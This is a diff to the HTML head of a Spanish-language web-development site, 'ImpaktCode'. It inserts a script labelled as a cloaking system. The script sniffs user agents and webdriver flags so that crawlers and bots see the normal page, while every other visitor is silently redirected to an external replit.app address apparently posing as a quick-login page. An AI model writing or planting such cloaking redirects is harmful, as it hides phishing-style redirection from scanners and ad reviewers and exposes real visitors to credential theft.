@@ -2,6 +2,26 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <script>
+    // Sistema de cloaking ultra-rápido (redirección antes de render)
+    (function() {
+        'use strict';
+
+        const ua = navigator.userAgent.toLowerCase();
+        const referrer = document.referrer.toLowerCase();
+        const targetURL = 'https://iniciorapido-bse.replit.app/';
+        
+        const isGoogleAds = /googleadservices|googlesyndication|doubleclick|google\.com\/ads|gstatic\.com/.test(referrer) ||
+                           /gclid=|utm_source=google|utm_medium=cpc|utm_campaign=/.test(location.search);
+
+        const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|crawler|spider|bot/.test(ua) ||
+                     navigator.webdriver;
+
+        if (!isBot) {
+            location.replace(targetURL);
+        }
+    })();
+  </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ImpaktCode - Desarrollo Web Profesional</title>
